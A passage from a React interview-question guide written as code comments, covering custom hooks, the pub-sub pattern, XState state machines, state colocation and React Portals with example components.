    const ws = new WebSocket(url);
    ws.onmessage = (e) => setData(e.data);
    return () => ws.close(); // Cleanup
  }, [url]);
  
  return data;
}

// 4. Non-visual logic can be extracted
// Authentication logic
function useAuth() {
  const [user, setUser] = useState(null);
  const login = async (credentials) => { /* ... * / };
  const logout = () => { /* ... * / };
  return { user, login, logout };
}

Best Practices: [web:176][web:179]
------------------------------------

// 1. Start with "use" [web:176][web:179]
function useCustomHook() { } // ✅
function customHook() { } // ❌

// 2. Keep hooks focused [web:176][web:179]
// ✅ Good - single responsibility
function useFetch(url) { /* only fetching * / }

// ❌ Bad - too much responsibility
function useFetchAndCacheAndValidate(url) { /* doing too much * / }

// 3. Return only necessary data [web:176]
// ✅ Good
function useFetch(url) {
  return { data, loading, error };
}

// ❌ Bad - returning internal state
function useFetch(url) {
  return { data, loading, error, internalState, cache, etc };
}

// 4. Document your hooks [web:176][web:179]
/**
 * Custom hook for fetching data
 * @param {string} url - API endpoint
 * @returns {{data: any, loading: boolean, error: string}}
 * /
function useFetch(url) { }

// 5. Use TypeScript for better DX
function useFetch<T>(url: string): {
  data: T | null;
  loading: boolean;
  error: string | null;
} { }

Summary:

Custom Hooks:
- Extract reusable logic [web:176]
- Must start with "use" [web:176][web:179]
- Can use other hooks [web:176]
- Share stateful logic [web:176]
- Keep focused on one task [web:176][web:179]
- Return only necessary data [web:176]
- Document thoroughly [web:176][web:179]
- Test independently [web:179]
*/


/**
99. What is the pub-sub (observer) pattern in React?
---------------------------------------------------

The Publisher-Subscriber (Pub-Sub) pattern is a messaging pattern where publishers
emit events without knowing who will receive them, and subscribers listen for
specific events without knowing who sent them. It enables loose coupling between
components.

Basic Pub-Sub Implementation:
------------------------------

// Simple event bus
class EventBus {
  constructor() {
    this.subscribers = {};
  }
  
  // Subscribe to event
  subscribe(event, callback) {
    if (!this.subscribers[event]) {
      this.subscribers[event] = [];
    }
    
    this.subscribers[event].push(callback);
    
    // Return unsubscribe function
    return () => {
      this.subscribers[event] = this.subscribers[event].filter(
        cb => cb !== callback
      );
    };
  }
  
  // Publish event
  publish(event, data) {
    if (!this.subscribers[event]) return;
    
    this.subscribers[event].forEach(callback => {
      callback(data);
    });
  }
  
  // Unsubscribe all from event
  unsubscribeAll(event) {
    delete this.subscribers[event];
  }
}

// Create global instance
const eventBus = new EventBus();

export default eventBus;

// Usage in components:

// Publisher component
function PublisherComponent() {
  const handleClick = () => {
    eventBus.publish('userLoggedIn', {
      userId: '123',
      username: 'john',
      timestamp: Date.now()
    });
  };
  
  return <button onClick={handleClick}>Login</button>;
}

// Subscriber component
function SubscriberComponent() {
  const [user, setUser] = useState(null);
  
  useEffect(() => {
    // Subscribe to event
    const unsubscribe = eventBus.subscribe('userLoggedIn', (data) => {
      console.log('User logged in:', data);
      setUser(data);
    });
    
    // Cleanup on unmount
    return () => {
      unsubscribe();
    };
  }, []);
  
  return (
    <div>
      {user ? (
        <p>Welcome, {user.username}!</p>
      ) : (
        <p>Please log in</p>
      )}
    </div>
  );
}

Custom Hook for Pub-Sub:
-------------------------

// useEventBus hook
function useEventBus(event, callback) {
  useEffect(() => {
    const unsubscribe = eventBus.subscribe(event, callback);
    return unsubscribe;
  }, [event, callback]);
}

// useEventPublish hook
function useEventPublish() {
  return useCallback((event, data) => {
    eventBus.publish(event, data);
  }, []);
}

// Usage
function Component() {
  const publish = useEventPublish();
  
  useEventBus('dataUpdated', (data) => {
    console.log('Data updated:', data);
  });
  
  const handleUpdate = () => {
    publish('dataUpdated', { id: 1, value: 'new' });
  };
  
  return <button onClick={handleUpdate}>Update</button>;
}

Real-World Examples:
--------------------

// Example 1: Notification System

// NotificationService.js
class NotificationService {
  constructor() {
    this.subscribers = [];
  }
  
  subscribe(callback) {
    this.subscribers.push(callback);
    return () => {
      this.subscribers = this.subscribers.filter(cb => cb !== callback);
    };
  }
  
  notify(message, type = 'info') {
    this.subscribers.forEach(callback => {
      callback({ message, type, id: Date.now() });
    });
  }
  
  success(message) {
    this.notify(message, 'success');
  }
  
  error(message) {
    this.notify(message, 'error');
  }
  
  warning(message) {
    this.notify(message, 'warning');
  }
}

export const notificationService = new NotificationService();

// NotificationProvider.jsx
function NotificationProvider({ children }) {
  const [notifications, setNotifications] = useState([]);
  
  useEffect(() => {
    const unsubscribe = notificationService.subscribe((notification) => {
      setNotifications(prev => [...prev, notification]);
      
      // Auto-remove after 3 seconds
      setTimeout(() => {
        setNotifications(prev => prev.filter(n => n.id !== notification.id));
      }, 3000);
    });
    
    return unsubscribe;
  }, []);
  
  return (
    <>
      {children}
      <div className="notifications">
        {notifications.map(notification => (
          <div key={notification.id} className={`notification ${notification.type}`}>
            {notification.message}
          </div>
        ))}
      </div>
    </>
  );
}

// Any component can publish notifications
function UserForm() {
  const handleSubmit = async (data) => {
    try {
      await saveUser(data);
      notificationService.success('User saved successfully!');
    } catch (error) {
      notificationService.error('Failed to save user');
    }
  };
  
  return <form onSubmit={handleSubmit}>...</form>;
}

// Example 2: Shopping Cart

// CartService.js
class CartService {
  constructor() {
    this.subscribers = [];
    this.cart = [];
  }
  
  subscribe(callback) {
    this.subscribers.push(callback);
    // Send current state immediately
    callback(this.cart);
    
    return () => {
      this.subscribers = this.subscribers.filter(cb => cb !== callback);
    };
  }
  
  notifySubscribers() {
    this.subscribers.forEach(callback => callback(this.cart));
  }
  
  addItem(item) {
    const existingItem = this.cart.find(i => i.id === item.id);
    
    if (existingItem) {
      existingItem.quantity += 1;
    } else {
      this.cart.push({ ...item, quantity: 1 });
    }
    
    this.notifySubscribers();
  }
  
  removeItem(itemId) {
    this.cart = this.cart.filter(item => item.id !== itemId);
    this.notifySubscribers();
  }
  
  updateQuantity(itemId, quantity) {
    const item = this.cart.find(i => i.id === itemId);
    if (item) {
      item.quantity = quantity;
      this.notifySubscribers();
    }
  }
  
  clear() {
    this.cart = [];
    this.notifySubscribers();
  }
  
  getTotal() {
    return this.cart.reduce((sum, item) => sum + item.price * item.quantity, 0);
  }
}

export const cartService = new CartService();

// useCart hook
function useCart() {
  const [cart, setCart] = useState([]);
  
  useEffect(() => {
    const unsubscribe = cartService.subscribe(setCart);
    return unsubscribe;
  }, []);
  
  return {
    cart,
    addItem: cartService.addItem.bind(cartService),
    removeItem: cartService.removeItem.bind(cartService),
    updateQuantity: cartService.updateQuantity.bind(cartService),
    clear: cartService.clear.bind(cartService),
    total: cartService.getTotal()
  };
}

// Product component (publisher)
function ProductCard({ product }) {
  const { addItem } = useCart();
  
  return (
    <div>
      <h3>{product.name}</h3>
      <p>${product.price}</p>
      <button onClick={() => addItem(product)}>
        Add to Cart
      </button>
    </div>
  );
}

// Cart component (subscriber)
function CartWidget() {
  const { cart, total } = useCart();
  
  return (
    <div>
      <span>Cart ({cart.length})</span>
      <span>${total}</span>
    </div>
  );
}

// Cart page (subscriber)
function CartPage() {
  const { cart, removeItem, updateQuantity, clear } = useCart();
  
  return (
    <div>
      <h1>Shopping Cart</h1>
      {cart.map(item => (
        <div key={item.id}>
          <span>{item.name}</span>
          <input
            type="number"
            value={item.quantity}
            onChange={(e) => updateQuantity(item.id, Number(e.target.value))}
          />
          <button onClick={() => removeItem(item.id)}>Remove</button>
        </div>
      ))}
      <button onClick={clear}>Clear Cart</button>
    </div>
  );
}

Pub-Sub with Context API:
--------------------------

// Combine pub-sub with Context for better integration

// EventContext.js
const EventContext = createContext();

export function EventProvider({ children }) {
  const eventBusRef = useRef(new EventBus());
  
  const publish = useCallback((event, data) => {
    eventBusRef.current.publish(event, data);
  }, []);
  
  const subscribe = useCallback((event, callback) => {
    return eventBusRef.current.subscribe(event, callback);
  }, []);
  
  return (
    <EventContext.Provider value={{ publish, subscribe }}>
      {children}
    </EventContext.Provider>
  );
}

export function useEvent() {
  const context = useContext(EventContext);
  if (!context) {
    throw new Error('useEvent must be used within EventProvider');
  }
  return context;
}

// Custom hook for subscribing
export function useEventSubscription(event, callback) {
  const { subscribe } = useEvent();
  
  useEffect(() => {
    return subscribe(event, callback);
  }, [event, callback, subscribe]);
}

// Usage
function App() {
  return (
    <EventProvider>
      <PublisherComponent />
      <SubscriberComponent />
    </EventProvider>
  );
}

function PublisherComponent() {
  const { publish } = useEvent();
  
  return (
    <button onClick={() => publish('buttonClicked', { time: Date.now() })}>
      Click Me
    </button>
  );
}

function SubscriberComponent() {
  useEventSubscription('buttonClicked', (data) => {
    console.log('Button clicked at:', data.time);
  });
  
  return <div>Listening for button clicks...</div>;
}

When to Use Pub-Sub:
--------------------

// ✅ Use pub-sub when:

// 1. Multiple components need to react to same event
// - Notification system
// - Shopping cart updates
// - User authentication state

// 2. Components are far apart in tree
// - Deep nesting makes prop drilling painful
// - Context would cause unnecessary re-renders

// 3. Loose coupling desired
// - Publisher doesn't need to know subscribers
// - Subscribers can be added/removed dynamically

// 4. Event-driven architecture
// - Analytics tracking
// - Logging
// - Real-time updates

// ❌ Don't use pub-sub when:

// 1. Simple parent-child communication
// - Use props instead

// 2. Complex state management needed
// - Use Redux/Zustand instead

// 3. Type safety important
// - Pub-sub is harder to type check

Advantages and Disadvantages:
------------------------------

// Advantages:
// ✅ Loose coupling
// ✅ Easy to add new subscribers
// ✅ No prop drilling
// ✅ Event-driven architecture
// ✅ Flexible communication

// Disadvantages:
// ❌ Harder to debug (implicit connections)
// ❌ Can lead to memory leaks (forgot unsubscribe)
// ❌ Less type-safe
// ❌ Can become complex
// ❌ Hard to track data flow

Summary:

Pub-Sub Pattern:
- Decouples publishers and subscribers
- Event-based communication
- Loose coupling between components
- Great for notifications, cart updates
- Requires cleanup (unsubscribe)
- Can be combined with Context
- Use when components far apart
- Avoid for simple parent-child communication
*/


/**
100. What is the state machine pattern (XState) in React?
---------------------------------------------------------

State machines are a way to model application state as a finite set of states
with explicit transitions between them. XState is a library that implements
state machines in JavaScript/React, making complex state management predictable.

Basic State Machine Concept:
-----------------------------

// Traffic light example - finite states with transitions

// States: GREEN, YELLOW, RED
// Transitions:
//   GREEN -> YELLOW (timer)
//   YELLOW -> RED (timer)
//   RED -> GREEN (timer)

// Without state machine (complex boolean logic)
function TrafficLight() {
  const [isGreen, setIsGreen] = useState(true);
  const [isYellow, setIsYellow] = useState(false);
  const [isRed, setIsRed] = useState(false);
  
  // Complex logic to manage state
  const next = () => {
    if (isGreen) {
      setIsGreen(false);
      setIsYellow(true);
    } else if (isYellow) {
      setIsYellow(false);
      setIsRed(true);
    } else if (isRed) {
      setIsRed(false);
      setIsGreen(true);
    }
  };
  
  return (
    <div>
      <div className={isGreen ? 'active' : ''}>Green</div>
      <div className={isYellow ? 'active' : ''}>Yellow</div>
      <div className={isRed ? 'active' : ''}>Red</div>
      <button onClick={next}>Next</button>
    </div>
  );
}

// With state machine (explicit states)
import { createMachine } from 'xstate';

const trafficLightMachine = createMachine({
  id: 'trafficLight',
  initial: 'green',
  states: {
    green: {
      on: {
        NEXT: 'yellow'
      }
    },
    yellow: {
      on: {
        NEXT: 'red'
      }
    },
    red: {
      on: {
        NEXT: 'green'
      }
    }
  }
});

Basic XState Setup:
-------------------

// Installation
npm install xstate @xstate/react

// Simple toggle machine
import { createMachine } from 'xstate';
import { useMachine } from '@xstate/react';

const toggleMachine = createMachine({
  id: 'toggle',
  initial: 'inactive',
  states: {
    inactive: {
      on: {
        TOGGLE: 'active'
      }
    },
    active: {
      on: {
        TOGGLE: 'inactive'
      }
    }
  }
});

function ToggleComponent() {
  const [state, send] = useMachine(toggleMachine);
  
  return (
    <div>
      <p>Status: {state.value}</p>
      <button onClick={() => send('TOGGLE')}>
        Toggle
      </button>
    </div>
  );
}

State Machine with Context:
----------------------------

// Machine with data (context) [web:177][web:180]

const counterMachine = createMachine({
  id: 'counter',
  initial: 'active',
  context: {
    count: 0,
    step: 1
  },
  states: {
    active: {
      on: {
        INCREMENT: {
          actions: 'increment'
        },
        DECREMENT: {
          actions: 'decrement'
        },
        SET_STEP: {
          actions: 'setStep'
        }
      }
    }
  }
}, {
  actions: {
    increment: (context) => {
      context.count += context.step;
    },
    decrement: (context) => {
      context.count -= context.step;
    },
    setStep: (context, event) => {
      context.step = event.value;
    }
  }
});

function Counter() {
  const [state, send] = useMachine(counterMachine);
  
  return (
    <div>
      <p>Count: {state.context.count}</p>
      <p>Step: {state.context.step}</p>
      
      <button onClick={() => send('INCREMENT')}>+</button>
      <button onClick={() => send('DECREMENT')}>-</button>
      
      <input
        type="number"
        value={state.context.step}
        onChange={(e) => send({ type: 'SET_STEP', value: Number(e.target.value) })}
      />
    </div>
  );
}

Entry and Exit Actions:
------------------------

// Actions that run when entering/exiting states [web:177][web:180]

const doorMachine = createMachine({
  id: 'door',
  initial: 'closed',
  context: {
    timesOpened: 0
  },
  states: {
    closed: {
      entry: 'logClosed',  // Runs when entering closed state [web:177]
      on: {
        OPEN: 'opened'
      }
    },
    opened: {
      entry: 'incrementOpened',  // Runs when entering opened state [web:177]
      exit: 'logClosing',  // Runs when exiting opened state [web:177]
      on: {
        CLOSE: 'closed'
      }
    }
  }
}, {
  actions: {
    logClosed: () => console.log('Door is closed'),
    incrementOpened: (context) => {
      context.timesOpened += 1;  // [web:177][web:180]
      console.log(`Door opened ${context.timesOpened} times`);
    },
    logClosing: () => console.log('Closing door...')
  }
});

Real-World Example: Form Machine:
----------------------------------

import { createMachine, assign } from 'xstate';
import { useMachine } from '@xstate/react';

const formMachine = createMachine({
  id: 'form',
  initial: 'editing',
  context: {
    formData: {
      name: '',
      email: ''
    },
    errors: {}
  },
  states: {
    editing: {
      on: {
        CHANGE: {
          actions: 'updateField'
        },
        SUBMIT: {
          target: 'validating'
        }
      }
    },
    validating: {
      entry: 'validateForm',
      always: [
        { target: 'submitting', cond: 'isValid' },
        { target: 'editing', actions: 'setErrors' }
      ]
    },
    submitting: {
      invoke: {
        id: 'submitForm',
        src: (context) => submitFormAPI(context.formData),
        onDone: {
          target: 'success'
        },
        onError: {
          target: 'error',
          actions: 'setApiError'
        }
      }
    },
    success: {
      entry: 'showSuccessMessage',
      on: {
        RESET: {
          target: 'editing',
          actions: 'clearForm'
        }
      }
    },
    error: {
      on: {
        RETRY: 'submitting',
        CANCEL: {
          target: 'editing',
          actions: 'clearErrors'
        }
      }
    }
  }
}, {
  actions: {
    updateField: assign((context, event) => ({
      formData: {
        ...context.formData,
        [event.field]: event.value
      }
    })),
    validateForm: assign((context) => {
      const errors = {};
      
      if (!context.formData.name) {
        errors.name = 'Name is required';
      }
      
      if (!context.formData.email) {
        errors.email = 'Email is required';
      } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(context.formData.email)) {
        errors.email = 'Invalid email';
      }
      
      return { errors };
    }),
    setErrors: (context) => {
      console.log('Validation errors:', context.errors);
    },
    setApiError: assign((context, event) => ({
      errors: { api: event.data.message }
    })),
    showSuccessMessage: () => {
      console.log('Form submitted successfully!');
    },
    clearForm: assign({
      formData: { name: '', email: '' },
      errors: {}
    }),
    clearErrors: assign({ errors: {} })
  },
  guards: {
    isValid: (context) => Object.keys(context.errors).length === 0
  }
});

function FormComponent() {
  const [state, send] = useMachine(formMachine);
  
  const { formData, errors } = state.context;
  
  const handleChange = (field, value) => {
    send({ type: 'CHANGE', field, value });
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    send('SUBMIT');
  };
  
  if (state.matches('success')) {
    return (
      <div>
        <p>Form submitted successfully!</p>
        <button onClick={() => send('RESET')}>Submit Another</button>
      </div>
    );
  }
  
  return (
    <form onSubmit={handleSubmit}>
      <div>
        <input
          value={formData.name}
          onChange={(e) => handleChange('name', e.target.value)}
          placeholder="Name"
          disabled={state.matches('submitting')}
        />
        {errors.name && <span className="error">{errors.name}</span>}
      </div>
      
      <div>
        <input
          value={formData.email}
          onChange={(e) => handleChange('email', e.target.value)}
          placeholder="Email"
          disabled={state.matches('submitting')}
        />
        {errors.email && <span className="error">{errors.email}</span>}
      </div>
      
      {state.matches('error') && (
        <div>
          <p className="error">{errors.api}</p>
          <button type="button" onClick={() => send('RETRY')}>
            Retry
          </button>
          <button type="button" onClick={() => send('CANCEL')}>
            Cancel
          </button>
        </div>
      )}
      
      <button type="submit" disabled={state.matches('submitting')}>
        {state.matches('submitting') ? 'Submitting...' : 'Submit'}
      </button>
    </form>
  );
}

Authentication State Machine:
------------------------------

const authMachine = createMachine({
  id: 'auth',
  initial: 'checkingAuth',
  context: {
    user: null,
    error: null
  },
  states: {
    checkingAuth: {
      invoke: {
        id: 'checkAuth',
        src: () => checkAuthStatus(),
        onDone: {
          target: 'authenticated',
          actions: assign((context, event) => ({
            user: event.data
          }))
        },
        onError: 'unauthenticated'
      }
    },
    unauthenticated: {
      on: {
        LOGIN: 'loggingIn'
      }
    },
    loggingIn: {
      invoke: {
        id: 'login',
        src: (context, event) => loginAPI(event.credentials),
        onDone: {
          target: 'authenticated',
          actions: assign((context, event) => ({
            user: event.data,
            error: null
          }))
        },
        onError: {
          target: 'unauthenticated',
          actions: assign((context, event) => ({
            error: event.data.message
          }))
        }
      }
    },
    authenticated: {
      on: {
        LOGOUT: {
          target: 'unauthenticated',
          actions: assign({
            user: null,
            error: null
          })
        }
      }
    }
  }
});

Benefits of State Machines: [web:177]
---------------------------------------

// 1. Impossible states are impossible
// Can't be both loading and error at same time

// 2. Explicit transitions
// All possible state changes documented

// 3. Visualizable
// Can generate state diagrams

// 4. Testable
// Test all state transitions

// 5. Predictable
// Same input always produces same output

When to Use State Machines:
----------------------------

// ✅ Use state machines when:

// 1. Complex state logic
// - Multi-step forms
// - Authentication flows
// - Game states

// 2. Many possible states
// - Fetching, success, error, idle
// - Multiple user flows

// 3. Need to prevent invalid states
// - Can't be loading and showing data
// - Explicit state transitions

// 4. State visualization needed
// - Complex flows
// - Documentation

Summary:

State Machines (XState):
- Finite set of states [web:177]
- Explicit transitions [web:177]
- Context for data [web:177][web:180]
- Entry/exit actions [web:177][web:180]
- Guards for conditions [web:177]
- Invoke for async [web:177]
- Prevents impossible states [web:177]
- Visualizable and testable [web:177]
- Great for complex flows [web:177]
*/


/**
101. What is state colocation and why does it matter?
----------------------------------------------------

State colocation means keeping state as close as possible to where it's used.
Instead of lifting state to a common ancestor, keep it local to the component
that needs it until it's actually needed elsewhere.

The Problem - Global State:
----------------------------

// ❌ Bad: Everything in global state
function App() {
  // All state at top level
  const [userName, setUserName] = useState('');
  const [userEmail, setUserEmail] = useState('');
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedTab, setSelectedTab] = useState('home');
  const [notifications, setNotifications] = useState([]);
  // ... 50 more state variables
  
  return (
    <div>
      <Header
        searchQuery={searchQuery}
        setSearchQuery={setSearchQuery}
        notifications={notifications}
      />
      <Sidebar
        selectedTab={selectedTab}
        setSelectedTab={setSelectedTab}
      />
      <MainContent
        userName={userName}
        userEmail={userEmail}
        setUserName={setUserName}
        setUserEmail={setUserEmail}
      />
      <Modal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
      />
    </div>
  );
}

// Problems:
// - App re-renders when ANY state changes
// - All children re-render unnecessarily
// - Prop drilling everywhere
// - Hard to maintain

The Solution - Colocated State:
--------------------------------

// ✅ Good: State where it's used
function App() {
  return (
    <div>
      <Header />
      <Sidebar />
      <MainContent />
      <ModalContainer />
    </div>
  );
}

function Header() {
  // State colocated in Header
  const [searchQuery, setSearchQuery] = useState('');
  const [notifications, setNotifications] = useState([]);
  
  return (
    <header>
      <SearchBar value={searchQuery} onChange={setSearchQuery} />
      <Notifications items={notifications} />
    </header>
  );
}

function Sidebar() {
  // State colocated in Sidebar
  const [selectedTab, setSelectedTab] = useState('home');
  
  return (
    <aside>
      <Tabs selected={selectedTab} onSelect={setSelectedTab} />
    </aside>
  );
}

function MainContent() {
  // State colocated in MainContent
  const [userName, setUserName] = useState('');
  const [userEmail, setUserEmail] = useState('');
  
  return (
    <main>
      <input value={userName} onChange={(e) => setUserName(e.target.value)} />
      <input value={userEmail} onChange={(e) => setUserEmail(e.target.value)} />
    </main>
  );
}

// Benefits:
// - Each component manages only its state
// - Changes don't affect other components
// - No prop drilling
// - Easier to understand and maintain

Real-World Example:
-------------------

// ❌ Bad: Premature lifting
function Dashboard() {
  // Lifted too early
  const [userFormData, setUserFormData] = useState({});
  const [productFilters, setProductFilters] = useState({});
  const [chartConfig, setChartConfig] = useState({});
  
  return (
    <div>
      <UserPanel
        formData={userFormData}
        setFormData={setUserFormData}
      />
      <ProductList
        filters={productFilters}
        setFilters={setProductFilters}
      />
      <Analytics
        config={chartConfig}
        setConfig={setChartConfig}
      />
    </div>
  );
}

// ✅ Good: Colocated
function Dashboard() {
  return (
    <div>
      <UserPanel />  {/* Manages own state * /}
      <ProductList />  {/* Manages own state * /}
      <Analytics />  {/* Manages own state * /}
    </div>
  );
}

function UserPanel() {
  // State lives here, not in parent
  const [formData, setFormData] = useState({
    name: '',
    email: ''
  });
  
  const handleSubmit = () => {
    saveUser(formData);
  };
  
  return (
    <div>
      <input
        value={formData.name}
        onChange={(e) => setFormData({...formData, name: e.target.value})}
      />
      <input
        value={formData.email}
        onChange={(e) => setFormData({...formData, email: e.target.value})}
      />
      <button onClick={handleSubmit}>Save</button>
    </div>
  );
}

When to Lift State:
-------------------

// Lift state only when actually needed by multiple components

// ✅ Good: Lift when shared
function ShoppingCart() {
  // Cart is shared between CartWidget and CartPage
  const [cart, setCart] = useState([]);
  
  return (
    <div>
      <Header>
        <CartWidget items={cart} />
      </Header>
      <CartPage items={cart} setItems={setCart} />
    </div>
  );
}

// ✅ Better: Use Context for deep sharing
const CartContext = createContext();

function ShoppingApp() {
  const [cart, setCart] = useState([]);
  
  return (
    <CartContext.Provider value={{ cart, setCart }}>
      <Header />  {/* Can access cart * /}
      <CartPage />  {/* Can access cart * /}
      <ProductList />  {/* Can access cart * /}
    </CartContext.Provider>
  );
}

Form Example:
-------------

// ❌ Bad: All fields in parent
function RegistrationForm() {
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [address, setAddress] = useState('');
  const [city, setCity] = useState('');
  const [zipCode, setZipCode] = useState('');
  // ... 20 more fields
  
  return (
    <form>
      <PersonalInfo
        firstName={firstName}
        setFirstName={setFirstName}
        lastName={lastName}
        setLastName={setLastName}
      />
      <AccountInfo
        email={email}
        setEmail={setEmail}
        password={password}
        setPassword={setPassword}
        confirmPassword={confirmPassword}
        setConfirmPassword={setConfirmPassword}
      />
      <AddressInfo
        address={address}
        setAddress={setAddress}
        city={city}
        setCity={setCity}
        zipCode={zipCode}
        setZipCode={setZipCode}
      />
    </form>
  );
}

// ✅ Good: Each section manages own state
function RegistrationForm() {
  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Collect data from refs or form data
    const formData = new FormData(e.target);
    submitRegistration(formData);
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <PersonalInfo />
      <AccountInfo />
      <AddressInfo />
      <button type="submit">Register</button>
    </form>
  );
}

function PersonalInfo() {
  // State colocated here
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  
  return (
    <fieldset>
      <legend>Personal Information</legend>
      <input
        name="firstName"
        value={firstName}
        onChange={(e) => setFirstName(e.target.value)}
      />
      <input
        name="lastName"
        value={lastName}
        onChange={(e) => setLastName(e.target.value)}
      />
    </fieldset>
  );
}

Modal Example:
--------------

// ❌ Bad: Modal state in App
function App() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  
  return (
    <div>
      <Header />
      <Content />
      <Footer openModal={() => setIsModalOpen(true)} />
      <Modal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} />
    </div>
  );
}

// ✅ Good: Modal state where it's triggered
function Footer() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  
  return (
    <footer>
      <button onClick={() => setIsModalOpen(true)}>
        Contact Us
      </button>
      
      <Modal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)}>
        <ContactForm />
      </Modal>
    </footer>
  );
}

Benefits of State Colocation:
------------------------------

// 1. Performance
// - Only relevant components re-render
// - Smaller component trees affected

// 2. Maintainability
// - State logic near where it's used
// - Easier to understand
// - Less cognitive load

// 3. Reusability
// - Components are self-contained
// - Can move/reuse easily

// 4. Testing
// - Test component in isolation
// - No need to setup parent state

// 5. Refactoring
// - Safe to move components
// - Less coupling

Guidelines:
-----------

// 1. Start local, lift when needed
function Component() {
  const [state, setState] = useState(); // Start here
  
  // Lift only when:
  // - Multiple siblings need it
  // - Parent needs to coordinate
  // - Need to persist across unmounts
}

// 2. Use composition over props
// ❌ Props drilling
<Parent>
  <Child data={data} setData={setData} />
</Parent>

// ✅ Composition
<Parent>
  {/* Child manages own state * /}
  <Child />
</Parent>

// 3. Use Context sparingly
// Only for truly global state:
// - Auth user
// - Theme
// - Language

// Not for everything:
// - Form fields
// - UI state
// - Temporary data

// 4. Keep related state together
// ✅ Good
const [user, setUser] = useState({
  name: '',
  email: ''
});

// ❌ Bad
const [userName, setUserName] = useState('');
const [userEmail, setUserEmail] = useState('');

Summary:

State Colocation:
- Keep state close to where it's used
- Don't lift state prematurely
- Lift only when actually shared
- Improves performance
- Easier to maintain
- More reusable components
- Better testing
- Start local, lift when needed
*/


/**
102. What is React Portal and when do you use it?
------------------------------------------------

React Portal provides a way to render children into a DOM node that exists
outside the parent component's DOM hierarchy. It allows you to "teleport"
JSX to a different part of the DOM while maintaining React's component tree.

Basic Portal Usage:
-------------------

import { createPortal } from 'react-dom';

function Modal({ isOpen, children }) {
  if (!isOpen) return null;
  
  // Render into #modal-root instead of parent
  return createPortal(
    <div className="modal-overlay">
      <div className="modal-content">
        {children}
      </div>
    </div>,
    document.getElementById('modal-root')  // Target DOM node
  );
}

// HTML structure:
// <div id="root">
//   <!-- Your React app -->
// </div>
// <div id="modal-root">
//   <!-- Modals render here -->
// </div>

// Usage
function App() {
  const [isOpen, setIsOpen] = useState(false);
  
  return (
    <div className="app">
      <button onClick={() => setIsOpen(true)}>
        Open Modal
      </button>
      
      {/* Modal renders outside app div * /}
      <Modal isOpen={isOpen}>
        <h2>Modal Title</h2>
        <p>Modal content</p>
        <button onClick={() => setIsOpen(false)}>Close</button>
      </Modal>
    </div>
  );
}

Why Use Portals:
----------------

// 1. Avoid CSS issues

// Without Portal:
<div style={{ overflow: 'hidden', position: 'relative' }}>
  <Modal />  {/* Clipped by parent styles! * /}
</div>

// With Portal:
<div style={{ overflow: 'hidden', position: 'relative' }}>
  <Modal />  {/* Renders outside, not clipped * /}
</div>

// 2. Z-index stacking context

// Without Portal:
<div style={{ zIndex: 1 }}>
  <Modal />  {/* Can't escape parent z-index * /}
</div>

// With Portal:
// Modal renders at root level, independent z-index

// 3. DOM hierarchy independence
// Component logically in React tree
// But rendered elsewhere in DOM

Modal Implementation:
---------------------

// Complete modal with Portal

function Modal({ isOpen, onClose, children }) {
  useEffect(() => {
    if (!isOpen) return;
    
    // Prevent body scroll when modal open
    document.body.style.overflow = 'hidden';
    
    // Handle Escape key
    const handleEscape = (e) => {
      if (e.key === 'Escape') {
        onClose();
      }
    };
    
    document.addEventListener('keydown', handleEscape);
    
    return () => {
      document.body.style.overflow = '';
      document.removeEventListener('keydown', handleEscape);
    };
  }, [isOpen, onClose]);
  
  if (!isOpen) return null;
  
  return createPortal(
    <div
      className="modal-overlay"
      onClick={onClose}  // Click outside to close
    >
      <div
        className="modal-content"
        onClick={(e) => e.stopPropagation()}  // Don't close when clicking modal
      >
        <button className="modal-close" onClick={onClose}>
          ×
        </button>
        {children}
      </div>
    </div>,
    document.getElementById('modal-root')
  );
}

// Usage
function App() {
  const [showModal, setShowModal] = useState(false);
  
  return (
    <div>
      <h1>My App</h1>
      <button onClick={() => setShowModal(true)}>
        Open Modal
      </button>
      
      <Modal isOpen={showModal} onClose={() => setShowModal(false)}>
        <h2>Modal Title</h2>
        <p>This modal is rendered via Portal!</p>
      </Modal>
    </div>
  );
}

Tooltip with Portal:
--------------------

function Tooltip({ children, content }) {
  const [isVisible, setIsVisible] = useState(false);
  const [position, setPosition] = useState({ x: 0, y: 0 });
  const triggerRef = useRef(null);
  
  const showTooltip = () => {
    if (triggerRef.current) {
      const rect = triggerRef.current.getBoundingClientRect();
      setPosition({
        x: rect.left + rect.width / 2,
        y: rect.top
      });
      setIsVisible(true);
    }
  };
  
  const hideTooltip = () => {
    setIsVisible(false);
  };
  
  return (
    <>
      <span
        ref={triggerRef}
        onMouseEnter={showTooltip}
        onMouseLeave={hideTooltip}
      >
        {children}
      </span>
      
      {isVisible && createPortal(
        <div
          className="tooltip"
          style={{
            position: 'absolute',
            left: position.x,
            top: position.y - 40,
            transform: 'translateX(-50%)'
          }}
        >
          {content}
        </div>,
        document.body
      )}
    </>
  );
}

// Usage
function App() {
  return (
    <div>
      <p>
        Hover over{' '}
        <Tooltip content="This is a tooltip!">
          <strong>this text</strong>
        </Tooltip>
        {' '}to see tooltip.
      </p>
    </div>
  );
}

Dropdown with Portal:
---------------------

function Dropdown({ trigger, children }) {
  const [isOpen, setIsOpen] = useState(false);
  const [position, setPosition] = useState({ x: 0, y: 0 });
  const triggerRef = useRef(null);
  
  const toggle = () => {
    if (!isOpen && triggerRef.current) {
      const rect = triggerRef.current.getBoundingClientRect();
      setPosition({
        x: rect.left,
        y: rect.bottom
      });
    }
    setIsOpen(!isOpen);
  };
  
  // Close on outside click
  useEffect(() => {
    if (!isOpen) return;
    
    const handleClickOutside = (e) => {
      if (triggerRef.current && !triggerRef.current.contains(e.target)) {
        setIsOpen(false);
      }
    };
    
    document.addEventListener('click', handleClickOutside);
    return () => document.removeEventListener('click', handleClickOutside);
  }, [isOpen]);
  
  return (
    <>
